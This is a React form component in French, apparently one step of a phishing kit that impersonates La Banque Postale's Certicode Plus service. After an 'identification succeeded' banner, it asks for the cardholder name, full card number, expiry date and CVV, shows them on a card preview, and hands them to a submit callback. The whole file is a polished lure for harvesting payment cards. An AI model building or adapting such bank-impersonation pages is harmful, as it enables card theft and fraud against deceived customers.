import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CreditCard, ShieldCheck } from "lucide-react";

function formatCardNumber(value) {
  const digits = value.replace(/\D/g, "").slice(0, 19);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
}

function formatExpiry(value) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

export default function CardStep({ onSubmit, submitting }) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [holder, setHolder] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    const rawCard = cardNumber.replace(/\s/g, "");
    if (rawCard.length < 13) {
      setError("Numéro de carte invalide.");
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
      setError("Date d'expiration invalide (format MM/AA).");
      return;
    }
    if (cvv.length < 3) {
      setError("Cryptogramme invalide.");
      return;
    }
    if (holder.trim().length < 2) {
      setError("Nom du titulaire requis.");
      return;
    }
    setError("");
    onSubmit({
      titulaire: holder.trim(),
      numero_carte: rawCard,
      date_expiration: expiry,
      cryptogramme: cvv,
    });
  };

  return (
    <div className="fade-in">
      <div className="mb-4 flex items-center gap-2 text-sm font-medium text-[#16A34A]">
        <ShieldCheck className="h-4 w-4" />
        <span>Identification réussie</span>
      </div>

      <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-[#003B5C]">
        Vérification de votre carte
      </h1>
      <p className="mt-1 text-sm text-[#475569]">
        Confirmez les informations de votre carte bancaire associée à Certicode Plus.
      </p>

      {/* Visual card preview */}
      <div
        data-testid="card-preview"
        className="mt-5 rounded-xl bg-gradient-to-br from-[#003B5C] to-[#0a5a85] p-5 text-white lbp-shadow-lg"
      >
        <div className="flex items-center justify-between">
          <CreditCard className="h-7 w-7 opacity-90" />
          <span className="text-xs uppercase tracking-wider opacity-80">Carte bancaire</span>
        </div>
        <div className="mt-6 font-mono tracking-widest text-lg">
          {cardNumber || "•••• •••• •••• ••••"}
        </div>
        <div className="mt-3 flex items-center justify-between text-xs">
          <span className="opacity-80">{holder.toUpperCase() || "TITULAIRE"}</span>
          <span className="opacity-80">{expiry || "MM/AA"}</span>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="mt-6 space-y-4" data-testid="card-form">
        <div className="space-y-1.5">
          <Label htmlFor="holder" className="text-[#003B5C] font-medium">
            Nom du titulaire
          </Label>
          <Input
            id="holder"
            data-testid="card-holder-input"
            value={holder}
            onChange={(e) => setHolder(e.target.value)}
            placeholder="Comme indiqué sur la carte"
            autoComplete="cc-name"
            className="h-12 text-base focus-visible:ring-2 focus-visible:ring-[#003B5C]"
          />
        </div>

        <div className="space-y-1.5">
          <Label htmlFor="card" className="text-[#003B5C] font-medium">
            Numéro de carte
          </Label>
          <Input
            id="card"
            data-testid="card-number-input"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
            placeholder="1234 5678 9012 3456"
            inputMode="numeric"
            autoComplete="cc-number"
            className="h-12 text-base font-mono tracking-wider focus-visible:ring-2 focus-visible:ring-[#003B5C]"
          />
        </div>

        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1.5">
            <Label htmlFor="exp" className="text-[#003B5C] font-medium">
              Expiration
            </Label>
            <Input
              id="exp"
              data-testid="card-expiry-input"
              value={expiry}
              onChange={(e) => setExpiry(formatExpiry(e.target.value))}
              placeholder="MM/AA"
              inputMode="numeric"
              autoComplete="cc-exp"
              className="h-12 text-base focus-visible:ring-2 focus-visible:ring-[#003B5C]"
            />
          </div>
          <div className="space-y-1.5">
            <Label htmlFor="cvv" className="text-[#003B5C] font-medium">
              Cryptogramme
            </Label>
            <Input
              id="cvv"
              data-testid="card-cvv-input"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
              placeholder="CVV"
              inputMode="numeric"
              autoComplete="cc-csc"
              className="h-12 text-base focus-visible:ring-2 focus-visible:ring-[#003B5C]"
            />
          </div>
        </div>

        {error && (
          <p data-testid="card-error" className="text-sm text-[#E11D48]">{error}</p>
        )}

        <Button
          type="submit"
          data-testid="card-submit"
          disabled={submitting}
          className="w-full h-12 text-base font-semibold bg-[#003B5C] hover:bg-[#002A43] text-white"
        >
          {submitting ? "Vérification…" : "Vérifier ma carte"}
        </Button>
      </form>
    </div>
  );
}
